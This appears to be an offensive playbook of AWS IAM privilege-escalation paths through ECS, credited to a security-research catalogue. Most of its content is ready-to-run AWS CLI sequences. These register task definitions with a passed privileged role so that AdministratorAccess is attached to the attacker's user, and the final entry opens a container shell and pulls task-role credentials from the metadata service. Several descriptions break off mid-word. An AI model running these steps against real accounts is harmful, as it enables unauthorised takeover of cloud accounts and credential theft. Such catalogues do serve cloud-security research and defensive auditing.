# ECS - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:CreateService [added: 2026-04]
- **Tags:** #Iam #Ecs #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + ecs service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, ecs:CreateCluster, ecs:RegisterTaskDefinition, ecs:CreateService; A role must exist that trusts ecs-tasks.amazonaws.com service principal
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [ecs-001] A principal with `iam:PassRole`, `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:CreateService` can escalate privileges by creating a new ECS cluster, registering a task definition with a privileged IAM role, and launching the task via an ECS service. The task runs with the permissions of the passed role and can execute arbitrary code using the AWS CLI or SDK to modify the starting pri
- **Payload/Method:**
```
# Step 1: Get the AWS account ID needed for constructing role ARNs
aws sts get-caller-identity

# Step 2: Create a new ECS cluster to host the privileged task
aws ecs create-cluster --cluster-name privesc-cluster

# Step 3: Retrieve the default VPC and subnet IDs required for Fargate network configuration
aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query "Vpcs[0].VpcId" --output text
aws ec2 describe-subnets --filters "Name=vpc-id,Values=<VPC_ID>" --query "Subnets[*].SubnetId" --output text

# Step 4: Register a task definition that passes the privileged role and configures a container to execute AWS CLI commands for pr
aws ecs register-task-definition \
  --family privesc-task \
  --network-mode awsvpc \
  --requires-compatibilities FARGATE \
  --cpu 256 \
  --memory 512 \
  --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
  --execution-role-arn "arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole" \
  --container-definitions '[
    {
      "name": "privesc-container",
      "image": "amazon/aws-cli",
      "essential": true,
      "command": [
        "iam", "attach-user-policy",
        "--user-name", "STARTING_USERNAME",
        "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
      ]
    }
  ]'

# Step 5: Create an ECS service to launch the task. The service will start the task with the privileged role, and the container wi
aws ecs create-service \
  --cluster privesc-cluster \
  --service-name privesc-service \
  --task-definition privesc-task \
  --desired-count 1 \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
```

### iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask [added: 2026-04]
- **Tags:** #Iam #Ecs #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + ecs service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, ecs:CreateCluster, ecs:RegisterTaskDefinition, ecs:RunTask; A role must exist that trusts ecs-tasks.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [ecs-002] A principal with `iam:PassRole`, `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` can achieve privilege escalation by creating a new ECS cluster, registering a task definition that uses a privileged IAM role, and running that task on Fargate. The task executes with the permissions of the passed role and can perform actions to escalate the starting principal's privileges, such a
- **Payload/Method:**
```
# Step 1: Get the current AWS account ID, which will be needed for constructing ARNs
aws sts get-caller-identity

# Step 2: Create a new ECS cluster to host the privileged task
aws ecs create-cluster --cluster-name privesc-cluster

# Step 3: Retrieve the default VPC and subnet IDs required for Fargate networking configuration
aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query "Vpcs[0].VpcId" --output text
aws ec2 describe-subnets --filters "Name=vpc-id,Values=<VPC_ID>" --query "Subnets[*].SubnetId" --output text

# Step 4: Register a task definition that uses the privileged role and contains a container that executes commands to escalate pri
aws ecs register-task-definition \
  --family privesc-task \
  --network-mode awsvpc \
  --requires-compatibilities FARGATE \
  --cpu 256 \
  --memory 512 \
  --task-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
  --execution-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
  --container-definitions '[{
    "name": "privesc-container",
    "image": "amazon/aws-cli:latest",
    "command": ["sh", "-c", "aws iam attach-user-policy --user-name VICTIM_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
  }]'

# Step 5: Run the task on the Fargate cluster with the privileged role, executing the escalation commands
aws ecs run-task \
  --cluster privesc-cluster \
  --task-definition privesc-task \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
```

### iam:PassRole + ecs:RegisterTaskDefinition + ecs:CreateService [added: 2026-04]
- **Tags:** #Iam #Ecs #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + ecs service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, ecs:RegisterTaskDefinition, ecs:CreateService; An ECS cluster must exist in the account
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [ecs-003] A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:CreateService` can create an ECS task definition with a privileged IAM role and launch it as a Fargate service. When the task runs, it executes with the permissions of the passed role. The level of access gained depends on the permissions of the available roles.
- **Payload/Method:**
```
# Step 1: Get your account ID for constructing resource ARNs
aws sts get-caller-identity

# Step 2: List available ECS clusters in the account
aws ecs list-clusters

# Step 3: Get the default VPC ID and subnet IDs for Fargate network configuration
aws ec2 describe-vpcs --filters "Name=isDefault,Values=true"
aws ec2 describe-subnets --filters "Name=vpc-id,Values=VPC_ID"

# Step 4: Register a task definition with the privileged role and container that executes commands to escalate privileges
aws ecs register-task-definition \
  --family privesc-task \
  --network-mode awsvpc \
  --requires-compatibilities FARGATE \
  --cpu 256 \
  --memory 512 \
  --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
  --execution-role-arn "arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole" \
  --container-definitions '[{
    "name": "privesc-container",
    "image": "public.ecr.aws/amazonlinux/amazonlinux:latest",
    "command": ["sh", "-c", "aws sts get-caller-identity; aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"],
    "essential": true,
    "logConfiguration": {
      "logDriver": "awslogs",
      "options": {
        "awslogs-group": "/ecs/privesc-task",
        "awslogs-region": "us-east-1",
        "awslogs-stream-prefix": "ecs"
      }
    }
  }]'

# Step 5: Create an ECS service that launches the task on Fargate
aws ecs create-service \
  --cluster CLUSTER_NAME \
  --service-name privesc-service \
  --task-definition privesc-task \
  --launch-type FARGATE \
  --desired-count 1 \
  --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],securityGroups=[SG_ID],assignPublicIp=ENABLED}"
```

### iam:PassRole + ecs:RegisterTaskDefinition + ecs:RunTask [added: 2026-04]
- **Tags:** #Iam #Ecs #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + ecs service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, ecs:RegisterTaskDefinition, ecs:RunTask; An ECS cluster must exist in the account
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [ecs-004] A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` can create a new ECS task definition and attach an existing IAM role to it. When the task is run on Fargate or EC2, the code executes with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.
- **Payload/Method:**
```
# Step 1: Get your AWS account ID for use in subsequent commands
aws sts get-caller-identity

# Step 2: Identify available ECS clusters in the account
aws ecs list-clusters

# Step 3: Get the default VPC and subnet IDs needed for Fargate network configuration
aws ec2 describe-vpcs --filters "Name=isDefault,Values=true"
aws ec2 describe-subnets --filters "Name=vpc-id,Values=VPC_ID"

# Step 4: Register a task definition that uses the privileged role and includes a container with commands to escalate privileges
aws ecs register-task-definition \
  --family privesc-task \
  --network-mode awsvpc \
  --requires-compatibilities FARGATE \
  --cpu 256 \
  --memory 512 \
  --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
  --execution-role-arn "arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole" \
  --container-definitions '[{
    "name": "exploit-container",
    "image": "public.ecr.aws/amazonlinux/amazonlinux:latest",
    "essential": true,
    "command": ["/bin/sh", "-c", "aws sts get-caller-identity && aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
  }]'

# Step 5: Run the task on Fargate, which will execute the container with the privileged role's permissions
aws ecs run-task \
  --cluster CLUSTER_NAME \
  --task-definition privesc-task \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
```

### iam:PassRole + ecs:RegisterTaskDefinition + ecs:StartTask [added: 2026-04]
- **Tags:** #Iam #Ecs #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + ecs service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, ecs:RegisterTaskDefinition, ecs:StartTask; An ECS cluster must exist with at least one registered EC2 container instance
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [ecs-005] A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:StartTask` can create a new ECS task definition and attach an existing privileged IAM role to it, then start the task on an existing EC2 container instance. By registering a task definition with a malicious container command and starting it on an EC2-based ECS cluster, the attacker can execute arbitrary code with the permissio
- **Payload/Method:**
```
# Step 1: Get your AWS account ID to construct resource ARNs
aws sts get-caller-identity

# Step 2: Discover available ECS clusters in the account (optional but helpful for finding target cluster)
aws ecs list-clusters

# Step 3: Retrieve container instance ARNs needed for StartTask command (requires an EC2-based cluster with registered instances)
aws ecs list-container-instances --cluster CLUSTER_NAME

# Step 4: Register a task definition with the privileged role and malicious container command that attaches AdministratorAccess to
aws ecs register-task-definition \
  --family privesc-task \
  --network-mode bridge \
  --task-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
  --container-definitions '[{
    "name": "privesc-container",
    "image": "amazonlinux:latest",
    "memory": 512,
    "essential": true,
    "command": [
      "/bin/sh",
      "-c",
      "aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && echo \"Successfully attached AdministratorAccess!\""
    ]
  }]'

# Step 5: Start the task on a specific container instance to execute the container command with elevated privileges
aws ecs start-task --cluster CLUSTER_NAME --task-definition privesc-task --container-instances CONTAINER_INSTANCE_ARN
```

### ecs:ExecuteCommand + ecs:DescribeTasks [added: 2026-04]
- **Tags:** #Ecs #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; ecs in scope
- **Prereq:** IAM perms: ecs:ExecuteCommand, ecs:DescribeTasks; An ECS service must have ECS Exec explicitly enabled (`enable_execute_command = 
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [ecs-006] A principal with `ecs:ExecuteCommand` and `ecs:DescribeTasks` can establish an interactive shell session in a running ECS container, but only if ECS Exec has been explicitly enabled on the service (it is disabled by default). Both permissions are required because the AWS CLI internally calls `DescribeTasks` to retrieve the container runtime ID needed to establish the SSM session. If the task has a
- **Payload/Method:**
```
# Step 1: Discover ECS clusters in the account
aws ecs list-clusters

# Step 2: List running tasks in the target cluster
aws ecs list-tasks --cluster CLUSTER_NAME

# Step 3: Get task details to find container names and verify ECS Exec is enabled
aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN

# Step 4: Establish an interactive shell session in the running container using ECS Exec
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ARN \
  --container CONTAINER_NAME \
  --interactive \
  --command "/bin/sh"

# Step 5: Inside the container, retrieve the task role credentials from the ECS metadata service
wget -qO- http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```
